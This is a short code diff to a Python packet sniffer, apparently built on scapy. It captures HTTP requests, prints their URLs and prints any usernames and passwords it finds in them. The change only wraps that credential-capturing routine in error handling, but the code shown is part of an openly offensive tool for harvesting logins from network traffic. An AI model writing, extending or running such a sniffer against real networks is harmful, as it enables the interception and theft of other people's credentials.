@@ -27,13 +27,18 @@ class Sniff:
                     return load
 
     def process_sniffed_packet(self, packet):
-        if packet.haslayer(http.HTTPRequest):
-            url = self.get_url(packet)
-            print("[+] HTTP Request >> " + url)
+        try:
+            if packet.haslayer(http.HTTPRequest):
+                url = self.get_url(packet)
+                print("[+] HTTP Request >> " + url)
 
-            login_info = self.get_login_info(packet)
-            if login_info:
-                print("\n\n[+] Possible username/password >> " + login_info + "\n\n")
+                login_info = self.get_login_info(packet)
+                if login_info:
+                    print("\n\n[+] Possible username/password >> " + login_info + "\n\n")
+
+        except Exception as e:
+            print(f'\n[-] ERROR: {e}')
+            sys.exit(0)
 
 
 if __name__ == '__main__':
